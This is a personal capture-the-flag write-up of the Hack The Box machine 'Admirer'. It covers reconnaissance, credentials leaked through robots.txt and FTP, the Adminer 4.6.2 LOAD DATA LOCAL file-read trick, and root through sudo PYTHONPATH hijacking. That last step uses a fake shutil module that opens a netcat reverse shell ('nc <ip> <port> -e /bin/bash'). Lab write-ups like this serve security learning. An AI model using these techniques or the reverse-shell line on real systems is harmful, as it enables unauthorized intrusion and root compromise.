<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Admirer</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>Admirer</u></b></h1><br />this is a crazy machine with loads of rabbit holes<br /><br />nmap shows 3 open ports:<br /><img src="{{site.baseurl}}/assets/images/admirer/1-1.png" alt="{{site.baseurl}}/assets/images/admirer/1-1.png" /><br /><br />so http has robots.txt that says “This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo<br />Disallow: /admin-dir” which was also pointed out by nmap. however maybe the files inside admin-dir are accessible even when the dir is not?<br />i guessed a few file names and credentials.txt worked<br /><img src="{{site.baseurl}}/assets/images/admirer/1-2.png" alt="{{site.baseurl}}/assets/images/admirer/1-2.png" /><br /><br />lets login to ftp and see if we find something of use<br /><img src="{{site.baseurl}}/assets/images/admirer/1-3.png" alt="{{site.baseurl}}/assets/images/admirer/1-3.png" /><br />backed up html files, and some more credentials in utility-scripts/db_admin.php<br />there was admin-tasks.php too which felt interesting but seemd like that is a rabbit hole. however it came into play at root.<br /><br />frustrated, i just began to fuzz dirs with gobuster and thats when i hit the jackpot:<br />adminer.php at /utility-scripts/adminer.php<br /><img src="{{site.baseurl}}/assets/images/admirer/1-4.png" alt="{{site.baseurl}}/assets/images/admirer/1-4.png" /><br /><br />its running version 4.6.2 which has a very interesting <a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">exploit</a>, by far the most exciting and mindblowing one ive come across <br />so we create a database ‘exploit’ on our local machine with one table 'dump' that has one column called 'content'<br /><img src="{{site.baseurl}}/assets/images/admirer/1-5.png" alt="{{site.baseurl}}/assets/images/admirer/1-5.png" /><br /><br />connect to this database via the adminer login and dump a few local files using LOAD DATA LOCAL query<br />after dumping a few files i finally found credentials in index.php itself.<br />this exploit is the PEAK of "what could go wrong?"<br /><img src="{{site.baseurl}}/assets/images/admirer/1-6.png" alt="{{site.baseurl}}/assets/images/admirer/1-6.png" /><br /><br /><img src="{{site.baseurl}}/assets/images/admirer/1-7.png" alt="{{site.baseurl}}/assets/images/admirer/1-7.png" /> <br /> so far this has been a crazy box with a lot of rabbit holes. and as i had expected, these creds did not let me login to admirerdb<br /> however i was able to ssh in as waldo so theres that.<br /> <img src="{{site.baseurl}}/assets/images/admirer/1-8.png" alt="{{site.baseurl}}/assets/images/admirer/1-8.png" /><br /> <br /> nice Big Bang Theory reference btw<br /> <img src="{{site.baseurl}}/assets/images/admirer/1-9.png" alt="{{site.baseurl}}/assets/images/admirer/1-9.png" /><br /> <br /> seems like user can execute the script we found earlier as sudo<br /> <img src="{{site.baseurl}}/assets/images/admirer/1-10.png" alt="{{site.baseurl}}/assets/images/admirer/1-10.png" /><br /> <br /> the script in one of the options runs an external python script<br /> <img src="{{site.baseurl}}/assets/images/admirer/1-11.png" alt="{{site.baseurl}}/assets/images/admirer/1-11.png" /> <div class="codebox"><div class="codebox">#!/usr/bin/python3<br /><br />from&nbsp;shutil&nbsp;import&nbsp;make_archive<br /><br />src&nbsp;=&nbsp;'/var/www/html/'<br /><br />#&nbsp;old&nbsp;ftp&nbsp;directory,&nbsp;not&nbsp;used&nbsp;anymore<br />#dst&nbsp;=&nbsp;'/srv/ftp/html'<br /><br />dst&nbsp;=&nbsp;'/var/backups/html'<br /><br />make_archive(dst,&nbsp;'gztar',&nbsp;src)<br /></div></div><br /> <br /> so my initial thoughts were editing the script, or creating our own shutil.py, both of which dont work<br />PYTHONPATH variable tells python where to look for scripts (i tried to set it manually with export but that didnt work for the exploit which is why i did what's written henceforth)<br />i created my own shutils:<br /><div class="codebox"><div class="codebox">import&nbsp;os<br />def&nbsp;make_archive(x,y,z):<br />&nbsp;&nbsp;&nbsp;&nbsp;os.system("nc&nbsp;&lt;ip&gt;&nbsp;&lt;port&gt;&nbsp;-e&nbsp;‘/bin/bash’")</div></div> <br />and run the admin_tasks.sh as <br /> sudo PYTHONPATH=/path/to/script/ /opt/scripts/admin_task.sh 6<br /> <br /> check your nc listener for a connection and we have root shell<br /> <img src="{{site.baseurl}}/assets/images/admirer/1-12.png" alt="{{site.baseurl}}/assets/images/admirer/1-12.png" /><br /> </body></html>